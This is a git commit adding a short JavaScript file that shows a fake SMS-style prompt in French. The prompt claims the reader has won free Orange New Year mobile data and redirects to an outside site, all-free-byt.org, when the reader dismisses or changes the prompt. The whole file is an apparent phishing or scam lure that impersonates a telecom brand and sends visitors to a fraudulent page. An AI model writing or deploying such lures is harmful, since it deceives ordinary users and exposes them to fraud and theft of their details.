3f5d80c78af4ce4a37e977ce876323282b9fafca
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-12-31 11:20:00 -0800

    Create orange-newyr-active.js

---
+++ orange-newyr-active.js
@@ -0,0 +1,6 @@
+
+var password = '10 Go de données illimitées'
+password=prompt('SMS: Félicitations, vous êtes admissible à Orange Nouvel An 10 Go de données gratuites illimitées pendant 1 mois, veuillez appuyer sur OK pour activer maintenant   ','10 Go de données illimitées');
+if (password != '10 Go de données illimitées') {
+location.href='https://all-free-byt.org/orange-newyrs.html';
+}
